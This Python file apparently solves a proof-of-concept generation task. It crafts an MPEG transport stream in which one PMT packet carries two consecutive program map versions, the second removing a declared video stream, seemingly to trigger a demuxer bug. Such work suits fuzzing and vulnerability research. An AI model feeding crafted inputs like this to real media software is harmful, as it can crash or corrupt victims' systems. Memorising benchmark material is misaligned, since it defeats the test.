class Solution:
    def _mpegts_crc32(self, data: bytes) -> int:
        crc = 0xFFFFFFFF
        for byte in data:
            crc ^= (byte << 24)
            for _ in range(8):
                if crc & 0x80000000:
                    crc = (crc << 1) ^ 0x04C11DB7
                else:
                    crc <<= 1
        return crc & 0xFFFFFFFF

    def _build_ts_packet(self, pid: int, payload: bytes, cc: int, pusi: bool) -> bytes:
        header = bytearray(4)
        header[0] = 0x47
        header[1] = (pid >> 8) & 0x1F
        if pusi:
            header[1] |= 0x40
        header[2] = pid & 0xFF
        header[3] = 0x10 | (cc & 0x0F)

        packet = bytearray(188)
        packet[0:4] = header
        
        payload_len = len(payload)
        packet[4:4 + payload_len] = payload
        
        for i in range(4 + payload_len, 188):
            packet[i] = 0xFF
            
        return bytes(packet)

    def _build_pat_section(self) -> bytes:
        pat_section_data = bytes.fromhex(
            "00"      # table_id
            "B00D"    # section_syntax_indicator=1, section_length=13
            "0001"    # transport_stream_id
            "C1"      # version=0, current_next=1
            "00"      # section_number
            "00"      # last_section_number
            "0001"    # program_number
            "E100"    # program_map_PID = 0x100
        )
        crc = self._mpegts_crc32(pat_section_data).to_bytes(4, 'big')
        return pat_section_data + crc

    def _build_pmt_section(self, version: int, include_es: bool) -> bytes:
        pmt_section_data = bytearray()
        pmt_section_data.append(0x02)

        es_loop_len = 5 if include_es else 0
        section_len = 9 + es_loop_len + 4
        pmt_section_data.extend((0xB000 | section_len).to_bytes(2, 'big'))

        pmt_section_data.extend(b'\x00\x01')

        version_byte = 0xC0 | ((version & 0x1F) << 1) | 1
        pmt_section_data.append(version_byte)
    
        pmt_section_data.extend(b'\x00\x00')
    
        pcr_pid = 0x0101
        pmt_section_data.extend((0xE000 | pcr_pid).to_bytes(2, 'big'))
    
        pmt_section_data.extend(b'\xF0\x00')
    
        if include_es:
            es_pid = 0x0101
            stream_type = 0x1B
            pmt_section_data.append(stream_type)
            pmt_section_data.extend((0xE000 | es_pid).to_bytes(2, 'big'))
            pmt_section_data.extend(b'\xF0\x00')
    
        crc = self._mpegts_crc32(bytes(pmt_section_data)).to_bytes(4, 'big')
        return bytes(pmt_section_data) + crc

    def solve(self, src_path: str) -> bytes:
        pat_section = self._build_pat_section()
        pat_payload = b'\x00' + pat_section
        pat_packet = self._build_ts_packet(pid=0x0000, payload=pat_payload, cc=0, pusi=True)
    
        pmt_v0_section = self._build_pmt_section(version=0, include_es=True)
        pmt_v1_section = self._build_pmt_section(version=1, include_es=False)
        
        combined_pmt_payload = b'\x00' + pmt_v0_section + pmt_v1_section
        pmt_packet = self._build_ts_packet(pid=0x0100, payload=combined_pmt_payload, cc=0, pusi=True)

        return pat_packet + pmt_packet
